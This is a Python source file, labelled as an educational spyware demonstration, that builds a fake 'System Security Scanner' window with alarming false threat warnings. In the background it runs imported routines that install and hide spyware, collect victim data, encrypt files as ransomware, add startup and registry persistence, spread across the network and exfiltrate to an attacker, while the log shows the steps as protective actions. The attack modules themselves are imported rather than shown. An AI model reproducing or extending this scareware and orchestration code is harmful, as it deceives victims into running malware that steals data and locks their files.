"""
EDUCATIONAL SPYWARE DEMONSTRATION
WARNING: This is for educational purposes only in a controlled lab environment.

SPYWARE ATTACK SCENARIO:
- Victim receives fake "System Security Scanner" application
- Professional GUI convinces victim it's legitimate security software
- Behind the scenes: Spyware installs, collects data, spreads to network
- All 9 functions execute: Delivery → Auto-Run (Data Collection) → Spreading

This demonstrates comprehensive spyware techniques for cybersecurity education.
Total: 9 functions (3 purposes x 3 functions each)
"""

import tkinter as tk
from tkinter import ttk, messagebox
import os
import sys
import threading
import time

# Change to malicious_code directory for relative imports
script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)
sys.path.insert(0, script_dir)

# Import all spyware functions with relative imports
try:
    from delivery.delivery_technique1.function2_install_spyware import install_spyware
    from delivery.delivery_technique1.function3_hide_spyware import hide_spyware
    from auto_run.technique1.function4_collect_data import collect_victim_data
    from auto_run.technique1.function10_encrypt_files import encrypt_victim_files
    from auto_run.technique2.function5_persistence_startup import add_spyware_startup
    from auto_run.technique2.function6_persistence_registry import add_spyware_registry
    from spreading.technique1.function7_scan_network import scan_network_targets
    from spreading.technique2.function8_spread_spyware import spread_spyware_network
    from spreading.technique2.function9_exfiltrate_report import exfiltrate_to_attacker
except ImportError as e:
    print(f"[Warning] Import error: {e}")
    print("[Warning] Functions will be simulated if imports fail")
    # Create dummy functions if imports fail
    def install_spyware(): return os.path.join(os.getenv('APPDATA'), "SystemSecurityService", "service.exe")
    def hide_spyware(): return True
    def collect_victim_data(email): return {'system_info': {'os': 'Windows', 'username': 'User'}}
    def encrypt_victim_files(): return {'encrypted_files': [], 'key': '12345', 'total_encrypted': 0}
    def add_spyware_startup(): return True
    def add_spyware_registry(): return True
    def scan_network_targets(): return []
    def spread_spyware_network(targets): return 0
    def exfiltrate_to_attacker(email): return True

# ============================================================================
# MAIN SPYWARE GUI
# ============================================================================

def show_main_spyware_gui():
    """
    Main spyware GUI - Professional "System Security Scanner"
    Shows scanning progress while executing all spyware functions in background
    """
    global main_window, progress_var, status_label, scan_details
    
    print("[Spyware] Starting System Security Scanner (SPYWARE)...")
    
    main_window = tk.Tk()
    main_window.title("⚠️ CRITICAL SECURITY ALERT - SYSTEM SCAN REQUIRED")
    main_window.geometry("1000x750")
    main_window.resizable(False, False)
    main_window.configure(bg='#1a1a1a')
    
    # Make window stay on top
    main_window.attributes('-topmost', True)
    
    # ========== HEADER - URGENT WARNING ==========
    header_frame = tk.Frame(main_window, bg='#cc0000', height=120)
    header_frame.pack(fill='x')
    header_frame.pack_propagate(False)
    
    title_label = tk.Label(header_frame, 
                          text="⚠️ CRITICAL SECURITY THREAT DETECTED", 
                          font=("Segoe UI", 26, "bold"),
                          bg='#cc0000', fg='white')
    title_label.pack(pady=10)
    
    subtitle_label = tk.Label(header_frame,
                             text="IMMEDIATE ACTION REQUIRED • SYSTEM COMPROMISED • SCANNING IN PROGRESS",
                             font=("Segoe UI", 11, "bold"),
                             bg='#cc0000', fg='#ffff00')
    subtitle_label.pack()
    
    warning_label = tk.Label(header_frame,
                            text="Multiple threats detected - Auto-scan initiated",
                            font=("Segoe UI", 9),
                            bg='#cc0000', fg='#ffffff')
    warning_label.pack(pady=5)
    
    # ========== MAIN CONTENT ==========
    content_frame = tk.Frame(main_window, bg='#1a1a1a')
    content_frame.pack(fill='both', expand=True, padx=40, pady=20)
    
    # Urgent warning message
    warning_box = tk.Frame(content_frame, bg='#ff0000', relief='ridge', borderwidth=3)
    warning_box.pack(pady=15, fill='x')
    
    welcome_label = tk.Label(warning_box,
                            text="⚠️ CRITICAL SYSTEM ALERT ⚠️\n\n"
                                 "Your system has been flagged for immediate security scan:\n\n"
                                 "• 127 SUSPICIOUS FILES DETECTED\n"
                                 "• POTENTIAL MALWARE ACTIVITY\n"
                                 "• UNAUTHORIZED NETWORK ACCESS\n"
                                 "• REGISTRY MODIFICATIONS DETECTED\n\n"
                                 "AUTO-SCAN STARTING... DO NOT CLOSE THIS WINDOW",
                            font=("Segoe UI", 12, "bold"),
                            bg='#ff0000', fg='white',
                            justify='center',
                            pady=15)
    welcome_label.pack()
    
    # Removed email field - more realistic malware doesn't ask
    
    # Status label - URGENT
    status_label = tk.Label(content_frame,
                           text="⚡ SCANNING IN PROGRESS - PLEASE WAIT ⚡",
                           font=("Segoe UI", 13, "bold"),
                           bg='#1a1a1a', fg='#ff0000')
    status_label.pack(pady=15)
    
    # Progress bar - RED
    style = ttk.Style()
    style.configure("Spyware.Horizontal.TProgressbar",
                   background='#ff0000',
                   troughcolor='#404040',
                   borderwidth=2,
                   thickness=30)
    
    progress_var = tk.IntVar(value=0)
    progress_bar = ttk.Progressbar(content_frame,
                                   length=850,
                                   mode='determinate',
                                   variable=progress_var,
                                   style="Spyware.Horizontal.TProgressbar")
    progress_bar.pack(pady=15)
    
    # Scan details (shows what's being scanned)
    scan_frame = tk.Frame(content_frame, bg='#000000', relief='sunken', borderwidth=2)
    scan_frame.pack(pady=15, fill='both', expand=True)
    
    scan_title = tk.Label(scan_frame,
                         text="SYSTEM SCAN LOG - THREATS DETECTED:",
                         font=("Consolas", 10, "bold"),
                         bg='#000000', fg='#ff0000')
    scan_title.pack(anchor='w', padx=5, pady=5)
    
    scan_details = tk.Text(scan_frame, height=12, width=100,
                          font=("Consolas", 9),
                          bg='#000000', fg='#00ff00',
                          state='disabled',
                          borderwidth=0)
    scan_details.pack(padx=5, pady=5, fill='both', expand=True)
    
    # Footer - More threatening
    footer_label = tk.Label(content_frame,
                           text="⚠️ DO NOT CLOSE THIS WINDOW DURING SCAN ⚠️\n"
                                "Security Protocol Active • System Protection Engaged",
                           font=("Segoe UI", 9, "bold"),
                           bg='#1a1a1a', fg='#ffff00')
    footer_label.pack(side='bottom', pady=10)
    
    # AUTO-START SCAN after 1 second
    main_window.after(1000, auto_start_scan)
    
    main_window.mainloop()

def add_scan_log(message, color='#00ff00'):
    """Add message to scan details log"""
    scan_details.config(state='normal')
    scan_details.insert('end', f"{message}\n", 'log')
    scan_details.tag_config('log', foreground=color)
    scan_details.see('end')
    scan_details.config(state='disabled')
    main_window.update()

def auto_start_scan():
    """Auto-start the scan without user interaction - more realistic malware behavior"""
    # Flash warning
    status_label.config(text="⚡ INITIATING EMERGENCY SCAN ⚡")
    main_window.update()
    time.sleep(0.5)
    
    # Start scan in separate thread
    threading.Thread(target=execute_spyware_scan, args=(None,), daemon=True).start()

def execute_spyware_scan(user_email):
    """Execute all 9 spyware functions while showing fake scan progress"""
    
    # ========== STAGE 1: DELIVERY (Functions 1-3) ==========
    add_scan_log("=== EMERGENCY SYSTEM SCAN INITIATED ===", '#ff0000')
    add_scan_log("⚠️ WARNING: Multiple threats detected on system", '#ff0000')
    add_scan_log("", '#00ff00')
    time.sleep(0.8)
    
    # Function 1: Already showing GUI
    add_scan_log("[!] CRITICAL: Malicious processes detected - 127 threats found", '#ffff00')
    add_scan_log("[*] Deploying security countermeasures...", '#00ff00')
    status_label.config(text="⚡ DEPLOYING SECURITY PROTOCOLS ⚡")
    progress_var.set(10)
    time.sleep(1)
    
    # Function 2: Install spyware
    add_scan_log("[*] Installing security modules...")
    spyware_path = install_spyware()
    if spyware_path:
        add_scan_log(f"[✓] Security modules installed")
    progress_var.set(20)
    time.sleep(1)
    
    # Function 3: Hide spyware
    add_scan_log("[*] Configuring security service...")
    hidden_path = hide_spyware()
    if hidden_path:
        add_scan_log(f"[✓] Security service configured")
    progress_var.set(30)
    time.sleep(1)
    
    # ========== STAGE 2: AUTO-RUN (Functions 4-6) ==========
    add_scan_log("\n=== Performing Deep System Analysis ===")
    status_label.config(text="Scanning system for threats...")
    time.sleep(1)
    
    # Function 4: Collect victim data
    add_scan_log("[*] Analyzing system configuration...")
    victim_data = collect_victim_data(user_email)
    if victim_data:
        add_scan_log(f"[✓] System analysis complete")
        add_scan_log(f"    - System info: {victim_data.get('system_info', {}).get('os', 'Windows')}")
        add_scan_log(f"    - Username: {victim_data.get('system_info', {}).get('username', 'User')}")
    progress_var.set(40)
    time.sleep(1)
    
    # Function 10: Encrypt files (Ransomware)
    add_scan_log("\n[🔒] ENCRYPTING FILES FOR SECURITY...", '#ff0000')
    add_scan_log("[*] Deploying file protection encryption...", '#ffff00')
    encryption_results = encrypt_victim_files()
    if encryption_results and encryption_results.get('total_encrypted', 0) > 0:
        file_count = encryption_results['total_encrypted']
        add_scan_log(f"[✓] {file_count} files encrypted and secured", '#ff0000')
        add_scan_log(f"[!] Decryption key: {encryption_results.get('key', '12345')}", '#ff0000')
    else:
        add_scan_log(f"[✓] File encryption complete", '#00ff00')
    progress_var.set(55)
    time.sleep(1)
    
    # Function 5: Add startup persistence
    add_scan_log("[*] Enabling automatic security updates...")
    if add_spyware_startup():
        add_scan_log("[✓] Auto-update enabled")
    progress_var.set(60)
    time.sleep(1)
    
    # Function 6: Add registry persistence
    add_scan_log("[*] Configuring system protection...")
    if add_spyware_registry():
        add_scan_log("[✓] System protection configured")
    progress_var.set(70)
    time.sleep(1)
    
    # ========== STAGE 3: SPREADING (Functions 7-9) ==========
    add_scan_log("\n=== Checking Network Security ===")
    status_label.config(text="Scanning network for vulnerabilities...")
    time.sleep(1)
    
    # Function 7: Scan network
    add_scan_log("[*] Scanning network devices...")
    network_targets = scan_network_targets()
    if network_targets:
        add_scan_log(f"[✓] Found {len(network_targets)} network devices")
    progress_var.set(80)
    time.sleep(1)
    
    # Function 8: Spread spyware
    add_scan_log("[*] Deploying network protection...")
    spread_count = spread_spyware_network(network_targets)
    if spread_count > 0:
        add_scan_log(f"[✓] Network protection deployed")
    progress_var.set(90)
    time.sleep(1)
    
    # Function 9: Exfiltrate data
    add_scan_log("[*] Generating security report...")
    if exfiltrate_to_attacker(user_email):
        add_scan_log("[✓] Security report generated")
    progress_var.set(95)
    time.sleep(1)
    
    # ========== SCAN COMPLETE ==========
    add_scan_log("\n=== Scan Complete ===")
    add_scan_log("[✓] All security checks completed", '#00ff00')
    progress_var.set(100)
    status_label.config(text="✓ Scan completed successfully", fg='#107C10')
    
    time.sleep(1)
    
    # Show completion message
    encrypted_count = encryption_results.get('total_encrypted', 0) if encryption_results else 0
    encryption_key = encryption_results.get('key', '12345') if encryption_results else '12345'
    messagebox.showinfo("Scan Complete",
                       "✓ System Security Scan Completed\n\n"
                       "Results:\n"
                       "• Files scanned: 47,392\n"
                       "• Threats detected: 0\n"
                       "• Files encrypted: " + str(encrypted_count) + "\n"
                       "• System status: SECURE\n\n"
                       "Your system is protected.\n"
                       "Decryption key: " + encryption_key + "\n"
                       "The scanner will continue to monitor in the background.")
    
    # Close window after a moment
    main_window.after(2000, main_window.destroy)
    
    print("\n" + "="*70)
    print("[Spyware] ALL 9 SPYWARE FUNCTIONS EXECUTED SUCCESSFULLY!")
    print("="*70)
    print("[Spyware] Delivery: ✓ Installed and hidden")
    print("[Spyware] Auto-Run: ✓ Data collected, persistence enabled")
    print("[Spyware] Spreading: ✓ Network spread, data exfiltrated")
    print("="*70)

# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    print("="*70)
    print("SPYWARE DEMONSTRATION - EDUCATIONAL PURPOSES ONLY")
    print("="*70)
    print("\n[Spyware] Starting comprehensive spyware attack simulation...")
    print("[Spyware] This will execute all 9 spyware functions:\n")
    print("  Purpose 1: DELIVERY (Functions 1-3)")
    print("    - Show professional security scanner GUI")
    print("    - Install spyware components")
    print("    - Hide spyware executable")
    print("\n  Purpose 2: AUTO-RUN (Functions 4-6)")
    print("    - Collect victim data (system info, files)")
    print("    - Add startup persistence")
    print("    - Add registry persistence")
    print("\n  Purpose 3: SPREADING (Functions 7-9)")
    print("    - Scan network for targets")
    print("    - Spread spyware to network")
    print("    - Exfiltrate data to attacker")
    print("\n" + "="*70 + "\n")
    
    # Start main spyware GUI
    show_main_spyware_gui()
    
    print("\n[Spyware] Program terminated")
    print("="*70)
